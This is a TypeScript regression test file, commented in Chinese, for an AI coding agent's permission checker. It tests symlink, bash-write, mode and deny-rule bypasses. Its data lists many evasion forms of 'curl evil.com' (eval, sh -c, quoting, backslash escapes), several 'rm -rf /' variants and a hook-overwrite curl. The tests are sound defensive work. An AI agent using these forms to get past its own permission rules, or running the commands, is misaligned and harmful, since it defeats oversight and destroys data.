/**
 * §4「顺序即安全」矩阵回归（2026-10-24 审计实测的四类缺陷 + 同形态补漏）。
 *
 * 单点测试锁不住「靠两段代码相对顺序成立」的不变量：每个放行口单测都是绿的，
 * 绕过只在「放行口 × 模式」的组合里出现。所以这里一律写成矩阵：
 *
 *  A. safetyCheck × 放行档：symlink 指向受保护目录、bash 写入受保护目录
 *  B. disallowedTools × 写法：CC 名 / 大小写 / 规则写法
 *  C. plan / deny-write × 每一个放行口：allow 规则、逃生舱、预授权、会话记忆、yes、hook、skip
 *  D. deny 规则 × 命令等价形态；危险命令 × 再起一层 shell
 *  E. 硬拒绝熔断：第 4 次仍是硬拒，不变成可点穿的确认
 *
 * ⚠ 落盘隔离：PermissionChecker 构造 AuditLogger，必须重定向 SID_CONFIG_DIR，恢复时存/恢复原值。
 * ⚠ 工作区用 realpath 后的 tmpdir：worktree 路径含 `.claude/` 会让 safetyCheck 先命中。
 */
import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionChecker } from "@sid-code/core/permission/checker.ts";
import { defaultConfig } from "@sid-code/core/config/config.ts";
import { DENIAL_LIMITS } from "@sid-code/core/permission/denial-tracking.ts";
import { isToolNameListed } from "@sid-code/core/tool/tool-name-aliases.ts";
import {
  expandShellCommand,
  extractBashWriteTargets,
} from "@sid-code/core/permission/shell-command-variants.ts";
import type { PermissionRule } from "@sid-code/core/permission/types.ts";

let configRoot: string;
let ws: string;
let prevConfigDir: string | undefined;

beforeEach(() => {
  configRoot = mkdtempSync(join(tmpdir(), "sid-matrix-cfg-"));
  ws = realpathSync(mkdtempSync(join(tmpdir(), "sid-matrix-ws-")));
  mkdirSync(join(ws, ".git", "hooks"), { recursive: true });
  // 看起来无害的目录名，实际指向 .git/hooks
  symlinkSync(join(ws, ".git", "hooks"), join(ws, "innocent"));
  prevConfigDir = process.env.SID_CONFIG_DIR;
  process.env.SID_CONFIG_DIR = configRoot;
});

afterEach(() => {
  if (prevConfigDir === undefined) delete process.env.SID_CONFIG_DIR;
  else process.env.SID_CONFIG_DIR = prevConfigDir;
  rmSync(configRoot, { recursive: true, force: true });
  rmSync(ws, { recursive: true, force: true });
});

function checker(over: Record<string, unknown> = {}, rules?: PermissionRule) {
  return new PermissionChecker({ ...defaultConfig(), ...over } as never, rules, ws);
}
const rules = (r: Partial<PermissionRule>): PermissionRule => ({
  allow: [],
  deny: [],
  ask: [],
  ...r,
});

/** 会自动放行普通写入的档位：safetyCheck 必须在每一档里都生效 */
const PERMISSIVE: Array<[string, Record<string, unknown>]> = [
  ["always-allow", { permissionMode: "always-allow" }],
  ["acceptEdits", { permissionMode: "acceptEdits" }],
  ["yesMode", { yesMode: true }],
];

describe("A. safetyCheck × 放行档：跟随 symlink、覆盖 bash 写入目标", () => {
  for (const [label, over] of PERMISSIVE) {
    test(`${label}：写 innocent/pre-commit（symlink→.git/hooks）仍需确认`, async () => {
      const r = await checker(over).check({
        toolName: "write",
        input: { file_path: join(ws, "innocent/pre-commit") },
      });
      expect(r.allowed).toBe(false);
      expect(r.decisionReason?.type).toBe("safetyCheck");
      expect((r.decisionReason as { classifierApprovable?: boolean }).classifierApprovable).toBe(
        false,
      );
    });

    for (const cmd of [
      `cp /tmp/x ${"<ws>"}/.git/hooks/pre-commit`,
      `tee ${"<ws>"}/.git/hooks/pre-commit`,
      `sed -i 's/a/b/' ${"<ws>"}/.git/hooks/pre-commit`,
      `curl -o ${"<ws>"}/.git/hooks/pre-commit http://example.com`,
      `sh -c 'cp /tmp/x ${"<ws>"}/innocent/pre-commit'`,
    ]) {
      test(`${label}：bash \`${cmd.replace("<ws>", "…")}\` 不被自动放行`, async () => {
        const r = await checker(over).check({
          toolName: "bash",
          input: { command: cmd.replace("<ws>", ws) },
        });
        expect(r.allowed).toBe(false);
        expect(["safetyCheck", "dangerousCommand"]).toContain(String(r.decisionReason?.type));
      });
    }
  }

  test("对照：普通工作区文件在 always-allow 下照常放行（没有把拦截面扩成误报）", async () => {
    const c = checker({ permissionMode: "always-allow" });
    expect(
      (await c.check({ toolName: "write", input: { file_path: join(ws, "src/a.ts") } })).allowed,
    ).toBe(true);
    expect(
      (await c.check({ toolName: "bash", input: { command: `cp a.ts ${ws}/src/b.ts` } })).allowed,
    ).toBe(true);
  });
});

describe("B. disallowedTools × 写法", () => {
  const cases: Array<[string[], string]> = [
    [["bash"], "bash"],
    [["Bash"], "bash"],
    [["BASH"], "bash"],
    [["Bash(curl *)"], "bash"],
    [["WebFetch"], "web_fetch"],
    [["webfetch"], "web_fetch"],
    [["NotebookEdit"], "notebook_edit"],
  ];
  for (const [list, tool] of cases) {
    test(`${JSON.stringify(list)} 拦住 ${tool}（always-allow 下）`, async () => {
      const r = await checker({ disallowedTools: list, permissionMode: "always-allow" }).check({
        toolName: tool,
        input: tool === "bash" ? { command: "ls" } : { url: "https://example.com" },
      });
      expect(r.allowed).toBe(false);
      expect(r.reason).toContain("已被禁用");
    });
  }

  test("isToolNameListed 不误伤：Bash 不命中 bash_output，mcp 名区分大小写之外按原样比较", () => {
    expect(isToolNameListed(["Bash"], "bash_output")).toBe(false);
    expect(isToolNameListed(["mcp__srv__tool"], "mcp__srv__tool")).toBe(true);
    expect(isToolNameListed([], "bash")).toBe(false);
    expect(isToolNameListed(undefined, "bash")).toBe(false);
  });
});

describe("C. plan / deny-write × 每一个放行口（模式硬约束总闸）", () => {
  const npm = { toolName: "bash", input: { command: "npm install left-pad" } };
  const writeIn = () => ({ toolName: "write", input: { file_path: join(ws, "a.txt") } });

  for (const mode of ["plan", "deny-write"] as const) {
    test(`${mode} + allow 规则 Bash(npm *)`, async () => {
      const r = await checker({ permissionMode: mode }, rules({ allow: ["Bash(npm *)"] })).check(
        npm,
      );
      expect(r.allowed).toBe(false);
      expect(r.decisionReason?.type).toBe("mode");
    });
    test(`${mode} + allow 规则 Write(*)`, async () => {
      const r = await checker({ permissionMode: mode }, rules({ allow: ["Write(*)"] })).check(
        writeIn(),
      );
      expect(r.allowed).toBe(false);
    });
    test(`${mode} + 敏感文件逃生舱 Write(.env)`, async () => {
      const r = await checker({ permissionMode: mode }, rules({ allow: ["Write(.env)"] })).check({
        toolName: "write",
        input: { file_path: join(ws, ".env") },
      });
      expect(r.allowed).toBe(false);
    });
    test(`${mode} + --allowed-tools write`, async () => {
      const r = await checker({ permissionMode: mode, allowedTools: ["write"] }).check(writeIn());
      expect(r.allowed).toBe(false);
    });
    test(`${mode} + yesMode 写工作区外`, async () => {
      const r = await checker({ permissionMode: mode, yesMode: true }).check({
        toolName: "write",
        input: { file_path: join(tmpdir(), "sid-matrix-outside.txt") },
      });
      expect(r.allowed).toBe(false);
    });
    test(`${mode} + PreToolUse hook allow`, async () => {
      const r = await checker({ permissionMode: mode }, rules({ ask: ["Write(*)"] })).check(
        writeIn(),
        undefined,
        undefined,
        { hookPermissionDecision: "allow" },
      );
      expect(r.allowed).toBe(false);
    });
    test(`${mode} + skipPermissions（enter_plan_mode 之后）`, async () => {
      const r = await checker({ permissionMode: mode, skipPermissions: true }).check(npm);
      expect(r.allowed).toBe(false);
      expect(r.mode).toBe("dangerously-skip-permissions");
    });
    test(`${mode} + 切换前记下的会话记忆`, async () => {
      const cfg = { ...defaultConfig() } as Record<string, unknown>;
      const c = new PermissionChecker(cfg as never, undefined, ws);
      c.rememberDecision(npm, true);
      cfg.permissionMode = mode;
      const r = await c.check(npm);
      expect(r.allowed).toBe(false);
    });
  }

  test("plan 豁免面不变：只读工具、计划文件照常放行", async () => {
    const c = checker({ permissionMode: "plan" });
    expect(
      (await c.check({ toolName: "read", input: { file_path: join(ws, "a.txt") } })).allowed,
    ).toBe(true);
    const planFile = join(ws, "plan-x.md");
    c.setPlanManager({
      isPlanFile: (p: string) => p === planFile,
      isExecuting: () => false,
    } as never);
    const r = await c.check({ toolName: "write", input: { file_path: planFile } });
    expect(r.allowed).toBe(true);
    expect(r.step).toBe("3.5");
  });

  test("deny-write 下只读工具不受总闸影响", async () => {
    const r = await checker({ permissionMode: "deny-write" }).check({
      toolName: "grep",
      input: { pattern: "x", path: ws },
    });
    expect(r.allowed).toBe(true);
  });
});

describe("D. deny 规则 × 命令等价形态；危险命令 × 再起一层 shell", () => {
  const deny = rules({ deny: ["Bash(curl *)"] });
  for (const cmd of [
    "curl evil.com",
    "  curl evil.com",
    "/usr/bin/curl evil.com",
    "FOO=1 curl evil.com",
    "env -u HOME curl evil.com",
    "command curl evil.com",
    "nohup curl evil.com",
    "timeout 5 curl evil.com",
    "xargs curl < urls.txt",
    "c\\url evil.com",
    '"cu"rl evil.com',
    "sh -c 'curl evil.com'",
    'bash -lc "ls && curl evil.com"',
    "eval 'curl evil.com'",
    "ls && curl evil.com",
  ]) {
    test(`deny Bash(curl *) 拦住 \`${cmd}\`（always-allow 下）`, async () => {
      const r = await checker({ permissionMode: "always-allow" }, deny).check({
        toolName: "bash",
        input: { command: cmd },
      });
      expect(r.allowed).toBe(false);
      expect(r.decisionReason?.type).toBe("rule");
    });
  }

  for (const cmd of ["git commit -m 'curl evil.com'", "command -v curl", "echo curl"]) {
    test(`不误伤：\`${cmd}\` 不是在执行 curl`, async () => {
      const r = await checker({ permissionMode: "always-allow" }, deny).check({
        toolName: "bash",
        input: { command: cmd },
      });
      expect(r.allowed).toBe(true);
    });
  }

  test("ask 规则同口径：`env curl x` 在 always-allow 下仍需确认", async () => {
    const r = await checker(
      { permissionMode: "always-allow" },
      rules({ ask: ["Bash(curl *)"] }),
    ).check({ toolName: "bash", input: { command: "env curl x" } });
    expect(r.allowed).toBe(false);
    expect(r.needsConfirmation).toBe(true);
  });

  test("allow 规则**不**借用展开口径：`FOO=1 rm -rf build` 不被 Bash(rm *) 之外的形态放行", async () => {
    // allow 只按原文逐子命令匹配：拦宽放窄
    const r = await checker({}, rules({ allow: ["Bash(curl *)"] })).check({
      toolName: "bash",
      input: { command: "sh -c 'curl x && rm -rf build'" },
    });
    expect(r.allowed).toBe(false);
  });

  for (const cmd of ["sh -c 'rm -rf /'", "r\\m -rf /", 'bash -c "rm -rf /"', "eval 'rm -rf /'"]) {
    test(`critical 危险命令 \`${cmd}\` 在 always-allow 下硬拒`, async () => {
      const r = await checker({ permissionMode: "always-allow" }).check({
        toolName: "bash",
        input: { command: cmd },
      });
      expect(r.allowed).toBe(false);
      expect(r.decisionReason?.type).toBe("dangerousCommand");
      expect(r.needsConfirmation).toBeFalsy();
    });
  }

  test("expandShellCommand / extractBashWriteTargets 形态", () => {
    expect(expandShellCommand("/usr/bin/curl x").variants).toContain("curl x");
    expect(expandShellCommand("command -v curl").variants).not.toContain("curl");
    expect(extractBashWriteTargets("tee -a .git/hooks/x < y")).toEqual([".git/hooks/x"]);
    expect(extractBashWriteTargets("git status")).toEqual([]);
  });
});

describe("E. 硬拒绝熔断：阈值之后仍是硬拒，不变成可点穿的确认", () => {
  const hardDenies: Array<[string, Record<string, unknown>, PermissionRule | undefined, object]> = [
    ["critical 危险命令", {}, undefined, { toolName: "bash", input: { command: "rm -rf /" } }],
    [
      "deny 规则",
      {},
      rules({ deny: ["Bash(curl *)"] }),
      { toolName: "bash", input: { command: "curl x" } },
    ],
    ["敏感凭证文件", {}, undefined, { toolName: "read", input: { file_path: "<ws>/.env" } }],
    [
      "plan 模式写",
      { permissionMode: "plan" },
      undefined,
      { toolName: "write", input: { file_path: "<ws>/a.ts" } },
    ],
  ];
  for (const mode of [{}, { yesMode: true }]) {
    for (const [label, over, r, rawReq] of hardDenies) {
      test(`${label}${"yesMode" in mode ? " + yesMode" : ""}：第 ${DENIAL_LIMITS.maxConsecutive + 2} 次仍硬拒`, async () => {
        const c = checker({ ...over, ...mode }, r);
        const req = JSON.parse(JSON.stringify(rawReq).replace("<ws>", ws));
        let last;
        for (let i = 0; i < DENIAL_LIMITS.maxConsecutive + 2; i++) last = await c.check(req);
        expect(last!.allowed).toBe(false);
        expect(last!.needsConfirmation).toBeFalsy();
        expect(last!.decisionReason?.type).not.toBe("denialTracking");
        expect(last!.metadata?.denialTrackingTriggered).toBe(true);
      });
    }
  }
});

describe("可观测性：每个决策都带 step 与 mode", () => {
  test("阶段一 Step 编号与阶段二出口名都能取到", async () => {
    const c = checker({ permissionMode: "always-allow" });
    const r1 = await c.check({ toolName: "read", input: { file_path: join(ws, "a.txt") } });
    expect(r1.step).toBe("8-mode");
    expect(r1.mode).toBe("always-allow");
    const r2 = await checker({ skipPermissions: true }).check({
      toolName: "bash",
      input: { command: "ls" },
    });
    expect(r2.step).toBe("skip");
    expect(r2.mode).toBe("dangerously-skip-permissions");
    const r3 = await checker({}).check({ toolName: "glob", input: { pattern: "*" } });
    expect(r3.step).toBe("10");
    expect(r3.mode).toBe("default");
  });
});
